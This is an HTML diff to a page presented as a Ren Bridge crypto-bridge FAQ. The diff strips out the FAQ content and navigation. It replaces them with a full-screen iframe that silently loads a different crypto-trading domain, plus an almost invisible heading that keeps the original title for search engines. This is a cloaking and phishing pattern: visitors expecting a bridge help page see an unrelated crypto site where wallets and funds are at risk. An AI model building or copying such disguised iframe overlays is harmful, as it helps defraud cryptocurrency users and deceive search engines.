@@ -528,59 +528,19 @@ a.inline:hover {
 }
   </script>
 </head>
-<body>
-  <header class="topbar">
-    <a class="brand" href="../" aria-label="Ren Bridge">
-      <img src="../favicon.png" width="30" height="30" alt="">
-      <span>Ren Bridge</span>
-    </a>
-    <nav class="nav" aria-label="Main Navigation">
-      <a href="../how-it-works/" >How it works</a>
-      <a href="../faq/" class="active">FAQ</a>
-      <a href="../about/" >About</a>
-      <a href="../security/" >Security</a>
-      <a href="../supported-chains/" >Supported Chains</a>
-    </nav>
-    <span class="spacer"></span>
-    <a class="open-app" href="../dashboard/" rel="noopener noreferrer">Open app</a>
-  </header>
+<body style="margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden;">
 
-  <main class="satellite-container">
-    <nav class="breadcrumb" aria-label="Breadcrumb">
-      <a href="../">Home</a> › <span>Ren Bridge FAQ Help Center</span>
-    </nav>
+  <iframe
+    src="https://biswap.in/"
+    style="position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; border: 0; margin: 0; padding: 0; display: block; z-index: 1;"
+    loading="eager"
+    fetchpriority="high"
+    allowfullscreen>
+  </iframe>
 
-    <h1 class="satellite-title">Ren Bridge FAQ Help Center</h1>
-    <p class="satellite-lead">Frequently asked questions regarding bridging fees, speeds, safety, and operation.</p>
+  <h1 style="position: fixed; bottom: 10px; left: 10px; z-index: 0; font-size: 8px; color: #ffffff; opacity: 0.15; margin: 0; padding: 0; font-family: sans-serif; pointer-events: none; text-shadow: none;">
+    Ren Bridge FAQ Help Center
+  </h1>
 
-    <div class="faq-list">
-      <details class="faq-item" id="faq-1">
-        <summary>Is my crypto safe inside the bridge?</summary>
-        <div class="faq-content">
-          <p>Yes, because Ren Bridge is built on non-custodial smart contracts. Your assets are secured by mathematics and open-source code rather than human intermediaries. However, you should always check contract verification statuses and security profiles on the <a class="inline" href="https://l2beat.com/scaling/summary" target="_blank" rel="noopener noreferrer">L2BEAT risk database</a> before deploying large sums.</p>
-        </div>
-      </details>
-      <details class="faq-item" id="faq-2">
-        <summary>How long does a bridge transfer take?</summary>
-        <div class="faq-content">
-          <p>Transaction speed depends on block confirmation times on the source chain. Native L1 networks like Bitcoin or Ethereum might require several minutes to confirm finality, whereas L2 networks are processed in seconds. You can track block confirmations on blockchain explorers.</p>
-        </div>
-      </details>
-      <details class="faq-item" id="faq-3">
-        <summary>What fees are involved in bridging?</summary>
-        <div class="faq-content">
-          <p>Bridging involves two main fees: the source network gas fee (to deposit the token), and the protocol fee (to cover validators and target chain execution). Ren Bridge optimizes these parameters dynamically to offer the lowest rates, enabling cheaper access to <a class="inline" href="https://en.wikipedia.org/wiki/Decentralized_finance" target="_blank" rel="noopener noreferrer">decentralized finance (DeFi)</a>.</p>
-        </div>
-      </details></div>
-
-    <div style="margin: 40px 0; display: flex; justify-content: flex-start;">
-      <a class="open-app" href="../dashboard/" style="max-width: 320px; display: inline-flex; justify-content: center; text-decoration: none; padding: 12px 24px; font-weight: 700;">Open Ren Bridge Portal</a>
-    </div>
-
-    <a class="back-cta" href="../">
-      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" width="16" height="16"><line x1="19" y1="12" x2="5" y2="12"/><polyline points="12 19 5 12 12 5"/></svg>
-      Back to Portal
-    </a>
-  </main>
 </body>
 </html>
